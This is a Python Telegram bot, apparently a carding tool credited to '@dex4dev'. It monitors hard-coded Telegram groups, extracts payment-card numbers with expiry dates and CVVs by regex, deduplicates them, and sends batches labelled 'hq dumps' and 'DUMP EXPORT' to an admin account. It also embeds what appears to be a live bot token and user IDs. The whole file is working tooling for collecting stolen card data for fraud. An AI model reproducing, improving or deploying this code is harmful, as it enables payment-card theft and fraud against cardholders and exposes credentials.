import logging
import re
import warnings
import io
import threading
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

warnings.filterwarnings("ignore")

# --- [ ⚙️ CONFIGURATION ] ---
BOT_TOKEN = "7963420197:AAGK-JSoXaxRNmRlszAQ3vLJf2DPz7i2r34"
ADMIN_ID = 7840042951
SOURCE_GROUPS = [-1002666375873, -1003518359837]

FILE_NAME = "hq_dumps_by_@dex4dev.txt"
PORT = 10000 

captured_cards = []
unique_cards = set()
limit_per_file = 100

logging.basicConfig(level=logging.INFO)

# --- [ 🌐 RENDER PORT BINDING ] ---
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is Online", 200

def run_flask():
    app.run(host='0.0.0.0', port=PORT)

# --- [ 🛠 IMPROVED ENGINE ] ---

def extract_cc(text):
    if not text: return None
    # Flexible Regex: Catching 15-16 digits followed by |, then MM|YY|CVV
    # This handles both standard and weird spacing
    pattern = r"(\d{15,16})[\s|/]+(\d{2})[\s|/]+(\d{2,4})[\s|/]+(\d{3,4})"
    match = re.search(pattern, text)
    if match:
        # Reformatting to standard CC|MM|YY|CVV
        return f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
    return None

async def send_captured_file(context: ContextTypes.DEFAULT_TYPE):
    global captured_cards, unique_cards
    if not captured_cards: return
    try:
        content = "\n".join(captured_cards)
        out_file = io.BytesIO(content.encode('utf-8'))
        out_file.name = FILE_NAME
        await context.bot.send_document(chat_id=ADMIN_ID, document=out_file, 
            caption=f"🏴‍☠️ <b>DUMP EXPORT</b>\n🔥 Total: <code>{len(captured_cards)}</code>", parse_mode="HTML")
        captured_cards, unique_cards = [], set()
    except Exception as e: logging.error(f"Error: {e}")

# --- [ 🚀 ADMIN HANDLERS ] ---

async def handle_incoming(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global captured_cards, unique_cards
    if not update.message: return
    
    chat_id = update.effective_chat.id
    is_admin = (update.effective_user.id == ADMIN_ID)
    
    # Check if from authorized source
    if not (chat_id in SOURCE_GROUPS or is_admin):
        return

    text = update.message.text or update.message.caption
    cc = extract_cc(text)
    
    if cc:
        if cc not in unique_cards:
            unique_cards.add(cc)
            captured_cards.append(cc)
            
            # Instant notification for the first few cards to verify it's working
            if len(captured_cards) <= 5 or len(captured_cards) % 10 == 0:
                await context.bot.send_message(ADMIN_ID, f"✅ <b>Hit Captured:</b>\n<code>{cc}</code>\nTotal: {len(captured_cards)}", parse_mode="HTML")

            if len(captured_cards) >= limit_per_file:
                await send_captured_file(context)
    else:
        # DEBUG: If admin sends something and it's NOT a CC, let admin know the bot saw it
        if is_admin and not update.message.text.startswith('/'):
            await update.message.reply_text("🔎 <i>Scanning message but no CC format found...</i>", parse_mode="HTML")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text(
        f"📈 <b>Stats:</b> {len(captured_cards)}/{limit_per_file}\n"
        f"📡 <b>Monitoring:</b> {len(SOURCE_GROUPS)} Groups", parse_mode="HTML")

# --- [ 🏁 INITIALIZATION ] ---

def main():
    threading.Thread(target=run_flask, daemon=True).start()
    application = Application.builder().token(BOT_TOKEN).job_queue(None).build()

    application.add_handler(CommandHandler("start", lambda u, c: u.message.reply_text("🔥 Collector Active")))
    application.add_handler(CommandHandler("status", status_cmd))
    application.add_handler(CommandHandler("getfile", lambda u, c: send_captured_file(c) if u.effective_user.id == ADMIN_ID else None))
    application.add_handler(CommandHandler("clear", lambda u, c: (captured_cards.clear(), unique_cards.clear())))
    
    application.add_handler(MessageHandler(filters.ALL, handle_incoming))

    print("--- SCANNER v27.0 READY ---")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
